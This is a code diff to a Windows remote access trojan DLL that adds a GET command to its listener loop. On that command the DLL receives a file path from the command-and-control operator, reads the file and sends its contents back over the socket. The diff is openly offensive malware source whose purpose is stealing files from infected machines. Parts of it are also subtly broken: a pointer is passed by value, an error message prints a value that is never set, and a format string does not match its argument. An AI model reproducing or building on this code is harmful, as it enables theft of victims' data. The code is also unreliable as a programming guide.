@@ -21,8 +21,7 @@ INT startListen()
 
     wsaVersion = MAKEWORD(2, 2);
 
-    status = WSAStartup(wsaVersion, &wsaData);
-    if (status != SUCCESS)
+    if (WSAStartup(wsaVersion, &wsaData))
     {
         sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed WSAStartup! Error code %u\n", status);
         OutputDebugStringA(msgBuf);
@@ -101,26 +100,60 @@ INT startListen()
              printf("Bytes received: %d \n", status);
              printf("bytes: %s\n", &recvBuf);
 
-             if (strcmp((const char*)&recvBuf, PUT) == 0)
+             // Add put file here
+
+             if (strcmp((const char*)&recvBuf, GET) == 0)
              {
                  // Will have to receive again for the filepath OR put it in the same packet...
                     // Prob safer to break up packets, could add delays etc
                  status = recv(clientSock, recvBuf, recvBufLen, 0);
-                 if (status > 0)
+                 if (status != SOCKET_ERROR)
                  {
+                     sprintf_s(msgBuf, "Performing get file on %s...\n", recvBuf);
+                     OutputDebugStringA(msgBuf);
+
                      char* fileBytes = NULL;
-                     status = performGetFile((const char*)&recvBuf, fileBytes);
+                     DWORD bufferSize = 0;
+                     status = performGetFile((const char*)&recvBuf, fileBytes, &bufferSize);
                      if (status != SUCCESS)
                      {
+                         // Send back failure here as well 
+
                          sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from performGetFile %d\n", status);
                          OutputDebugStringA(msgBuf);
                          goto cleanup;
                      }
 
                      sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Read %s bytes from file\n", fileBytes);
-                 }
+                     OutputDebugStringA(msgBuf);
+                     OutputDebugStringA("Sending status SUCCESS back to C2; sending buffer back to C2...");
 
-                 // Now send back our bytes...
+                     status = send(clientSock, "SUCCESS", 8, 0);
+                     if (status == SOCKET_ERROR)
+                     {
+                         sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (status code) %d\n", WSAGetLastError());
+                         OutputDebugStringA(msgBuf);
+                         status = WSAGetLastError();
+                         goto cleanup;
+                     }
+
+                     // Fail here because of our pointer?
+                     status = send(clientSock, fileBytes, bufferSize, 0);
+                     if (status == SOCKET_ERROR)
+                     {
+                         sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from send (file bytes) %d\n", WSAGetLastError());
+                         OutputDebugStringA(msgBuf);
+                         status = WSAGetLastError();
+                         goto cleanup;
+                     }
+                 }
+                 // Failed to get our file path...
+                 else
+                 {
+                     OutputDebugStringA("RAT-Dll::startListen - Failure received from recv (file path)\n");
+                     status = FAILURE;
+                     goto cleanup;
+                 }
 
                  
              }
